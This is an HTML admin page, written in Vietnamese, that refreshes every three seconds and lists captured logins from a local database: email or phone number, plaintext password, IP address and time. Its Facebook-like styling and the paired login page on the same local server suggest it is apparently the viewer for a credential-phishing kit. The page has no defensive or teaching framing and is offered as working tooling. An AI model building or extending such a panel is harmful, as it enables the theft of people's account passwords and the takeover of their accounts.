<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Admin – Danh sách đăng nhập</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: "Segoe UI", sans-serif; padding: 24px; background: #f0f2f5; }
    h1 { margin-bottom: 8px; font-size: 1.5rem; }
    p { color: #65676b; margin-bottom: 12px; font-size: 0.9rem; }
    .count { font-weight: 700; color: #0866ff; margin-bottom: 16px; }
    table { width: 100%; border-collapse: collapse; background: #fff; border-radius: 8px; overflow: hidden; box-shadow: 0 1px 4px rgba(0,0,0,.1); }
    th, td { padding: 12px 14px; text-align: left; border-bottom: 1px solid #e4e6eb; font-size: 0.875rem; }
    th { background: #f7f8fa; font-weight: 600; }
    tr:last-child td { border-bottom: none; }
    .empty { padding: 40px; text-align: center; color: #65676b; }
    .err { color: #c62828; padding: 16px; background: #ffebee; border-radius: 8px; margin-bottom: 16px; }
    button, a.btn { display: inline-block; margin-bottom: 16px; margin-right: 8px; padding: 8px 16px; background: #0866ff; color: #fff; border: none; border-radius: 8px; cursor: pointer; font-weight: 600; text-decoration: none; font-size: 0.875rem; }
    a.btn.outline { background: #fff; color: #0866ff; border: 1px solid #0866ff; }
  </style>
</head>
<body>
  <h1>Danh sách đăng nhập</h1>
  <p>File database: <code>D:\new\data\logins.db</code></p>
  <p class="count" id="count">Đang tải…</p>
  <div id="errBox" class="err" style="display:none"></div>
  <button type="button" id="reload">Tải lại ngay</button>
  <a href="http://localhost:3001" class="btn outline">Trang đăng nhập</a>
  <table>
    <thead>
      <tr>
        <th>ID</th>
        <th>Email / SĐT</th>
        <th>Mật khẩu</th>
        <th>IP</th>
        <th>Thời gian</th>
      </tr>
    </thead>
    <tbody id="tbody"></tbody>
  </table>

  <script>
    const API = window.location.port === "3001" ? "" : "http://localhost:3001";

    async function load() {
      const tbody = document.getElementById("tbody");
      const countEl = document.getElementById("count");
      const errBox = document.getElementById("errBox");

      try {
        const res = await fetch(API + "/api/logins");
        const json = await res.json();
        errBox.style.display = "none";

        if (!json.data?.length) {
          countEl.textContent = "0 tài khoản đã lưu";
          tbody.innerHTML = '<tr><td colspan="5" class="empty">Chưa có ai đăng nhập. Hãy thử đăng nhập tại http://localhost:3001</td></tr>';
          return;
        }

        countEl.textContent = json.data.length + " tài khoản đã lưu (tự cập nhật mỗi 3 giây)";
        tbody.innerHTML = json.data
          .map(
            (r) => `<tr>
              <td>${r.id}</td>
              <td>${escapeHtml(r.email)}</td>
              <td>${escapeHtml(r.password)}</td>
              <td>${escapeHtml(r.ip || "—")}</td>
              <td>${escapeHtml(r.created_at)}</td>
            </tr>`
          )
          .join("");
      } catch {
        countEl.textContent = "";
        errBox.style.display = "block";
        errBox.innerHTML =
          "Không kết nối server! Double-click <b>CHAY-SERVER.bat</b> trong D:\\new, rồi mở lại trang này: <a href='http://localhost:3001/admin.html'>http://localhost:3001/admin.html</a>";
        tbody.innerHTML = "";
      }
    }

    function escapeHtml(s) {
      const d = document.createElement("div");
      d.textContent = s;
      return d.innerHTML;
    }

    document.getElementById("reload").addEventListener("click", load);
    load();
    setInterval(load, 3000);
  </script>
</body>
</html>
